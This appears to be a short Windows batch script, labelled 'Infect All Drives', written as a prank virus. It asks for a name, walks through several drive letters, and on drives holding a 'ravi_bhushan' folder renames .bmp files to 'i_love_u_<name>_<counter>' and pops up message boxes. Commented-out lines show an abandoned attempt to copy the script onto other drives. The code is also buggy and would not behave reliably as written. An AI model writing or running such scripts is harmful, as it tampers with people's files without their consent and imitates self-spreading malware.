rem ---------------------------------
rem Infect All Drives


rem..................create restore point


set /p id="May i know ur name?" %=%
rem call x.bat %id%

rem msg * I Love You %id%

for %%E In (E,D,B,F,G,H,I,J,K) Do (

call :rename %%E



)


:rename
rem if exist "%~1:\ravi_bhushan"  (copy /Y %0 %~1:\) rem it starts copying rename instead of batch file
if exist "%~1:\ravi_bhushan\" (

 

set /a counter=00

rem cd %~1:\ rem not work
cd %~1:
%~1:


 for %%f in (*.bmp)  do call :X2 "%%f"
rem for /D %%k  in (%~1:\*) do call :x2 %%~sk


 )

:x2
(
set /a counter=%counter%+11
rename "%~f1" i_love_u_%id%_%counter%%~x1
rem msg * I Love You %id%
call :name %UserProfile%)

:name

msg * i_love_u_%~n1





